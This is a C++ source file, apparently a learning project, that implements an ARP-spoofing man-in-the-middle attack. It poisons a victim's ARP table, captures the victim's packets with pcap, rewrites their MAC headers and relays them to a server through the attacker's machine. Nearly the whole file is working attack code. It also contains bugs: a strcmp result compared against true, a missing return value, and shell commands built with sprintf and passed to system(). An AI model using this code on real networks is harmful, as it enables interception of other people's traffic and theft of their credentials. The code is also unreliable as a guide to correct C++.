#include "hackARP.h"

#include <iostream>
#include <typeinfo>
#include <bitset>
#include <iomanip>
#include <string.h>
#include <unistd.h> // for sleep() function
#include <sys/socket.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>

#include <pcap.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>

using namespace std;

void printLine();
void printByHexData(u_int8_t *printArr, int length);
void atoiIP(char* ch_ip, uint8_t* num_ip);
int getAttackerMAC(uint8_t* attacker_mac, char* device);
void getMAC(uint8_t* victim_ip, uint8_t* victim_mac);
// void hackARP(char* device, uint8_t* server_ip, uint8_t* victim_ip);
bool maccmp(uint8_t* a, uint8_t* b, int size);

int main(int argc, char* argv[]) {
  // victim <-> attacker <-> server
  // sudo ./main device_name server_ip attacker_ip victim_ip

  // cout << device << endl;
  char* device = argv[1];

  // server IP Address
  uint8_t server_ip[4];
  atoiIP(argv[2], server_ip);

  // attacker IP Address
  uint8_t attacker_ip[4];
  atoiIP(argv[3], attacker_ip);

  // victim IP Address
  uint8_t victim_ip[4];
  atoiIP(argv[4], victim_ip);

  // get the server mac
  uint8_t server_mac[6];
  getMAC(server_ip, server_mac);

  // get the attacker mac
  uint8_t attacker_mac[6];
  getAttackerMAC(attacker_mac, device);

  // hack ARP table
  hackARP(device, server_ip, victim_ip);
  usleep(100000);

  // pcap
  char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcd =  pcap_open_live(device, BUFSIZ, 1, 200, errbuf);
	struct pcap_pkthdr *hdr;
	const u_char* pkt_data;
	int value_of_next_ex;

  // variable
	uint8_t* pkt;
  struct ether_header* ethHeader;
  struct ip* ipHeader;
  // struct icmp* icmpHeader;
  // struct in_addr att_addr;

  while(true) {
		value_of_next_ex = pcap_next_ex(pcd, &hdr, &pkt_data);
		switch (value_of_next_ex) {
			case 1:{
          pkt = (uint8_t*)pkt_data;
          cout << "before: ";
          printByHexData(pkt, hdr->len);

          // Get Ethernet header
          ethHeader = (struct ether_header*)pkt;

          // Check the IP header
          if(ntohs(ethHeader->ether_type) == ETHERTYPE_IP) {
            // Get IP header and lengths
            pkt += sizeof(struct ether_header);
            ipHeader = (struct ip*)pkt;
            int ipHeaderLength = ipHeader->ip_hl * 4;

            char att_ip[20], temp[20];
            sprintf(att_ip,"%d.%d.%d.%d", attacker_ip[0], attacker_ip[1], attacker_ip[2], attacker_ip[3]);
            sprintf(temp, "%s", inet_ntoa(ipHeader->ip_dst));

            if(strcmp(temp, att_ip) == true) {
              if(maccmp(ethHeader->ether_dhost, attacker_mac, 6) == true) {

                pkt = (uint8_t*)pkt_data;
                memcpy(pkt, server_mac, 6);
                memcpy(pkt+6, attacker_mac, 6);
                cout << "after: ";
                printByHexData(pkt, hdr->len);
                printLine();
                pcap_sendpacket(pcd, pkt, hdr->len);
              }
            }
          }
					break;
				}
			case 0:
				cout << "need a sec.. to packet capture" << endl;
				continue;
			case -1:
				perror("pcap_next_ex function has an error!!!");
				exit(1);
			case -2:
				cout << "the packet have reached EOF!!" << endl;
				exit(0);
			default:
				break;
		}
	}

  return 0;
}

void printLine() {
	cout << "-----------------------------------------------" << endl;
}

void printByHexData(u_int8_t *printArr, int length) {
	for(int i=0; i<length; i++) {
		if(i%16 == 0)
			cout << endl;
		cout << setfill('0');
		cout << setw(2) << hex << (int)printArr[i] << " ";
	}
	cout << dec << endl;
	// printLine();
}

void atoiIP(char* ch_ip, uint8_t* num_ip) {
  int i = 0;

  char* temp = strtok(ch_ip, ".");
  while (temp != NULL){
    num_ip[i] = atoi(temp);
    temp = strtok(NULL,".");
    // printf("%d\n", num_ip[i]);
    i++;
  }
}

int getAttackerMAC(uint8_t* attacker_mac, char* device) {
    struct ifreq ifr;
    int s;
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
      perror("socket");
      return -1;
    }

    strcpy(ifr.ifr_name, device);
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
      perror("ioctl");
      return -1;
    }

    memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);

    close(s);
}

void getMAC(uint8_t* victim_ip, uint8_t* victim_mac) {
    char fbuffer[18], ch_ip[20];
    char* ch_mac[6];
    int i = 0;

    sprintf(ch_ip, "%d.%d.%d.%d", victim_ip[0], victim_ip[1], victim_ip[2], victim_ip[3]);

    char system_call[50];
    sprintf(system_call, "arp -a %s | cut -f 4 -d \" \" > mac.txt", ch_ip);
    system(system_call);

    FILE *fp = fopen("mac.txt", "r");
    fgets(fbuffer, sizeof(fbuffer), fp);

    char* temp = strtok(fbuffer, ":");
    while (temp != NULL) {
      victim_mac[i] = strtol(temp, NULL, 16);
      temp = strtok(NULL, ":");
      // printf("%02x\n", victim_mac[i]);
      i++;
    }
}

// void hackARP(char* device, uint8_t* server_ip, uint8_t* victim_ip) {
//   char svr_ip[20], vctm_ip[20];
//
//   sprintf(svr_ip, "%d.%d.%d.%d", server_ip[0], server_ip[1], server_ip[2], server_ip[3]);
//   sprintf(vctm_ip, "%d.%d.%d.%d", victim_ip[0], victim_ip[1], victim_ip[2], victim_ip[3]);
//
//   char system_call[50];
//   sprintf(system_call, "sudo ./hackARP %s %s %s", device, svr_ip, vctm_ip);
//   cout << system_call << endl;
//   system(system_call);
// }

bool maccmp(uint8_t* a, uint8_t* b, int size) {
  for(int i=0; i<size; i++){
    if(a[i] != b[i]){
      return false;
    }
  }
  return true;
}
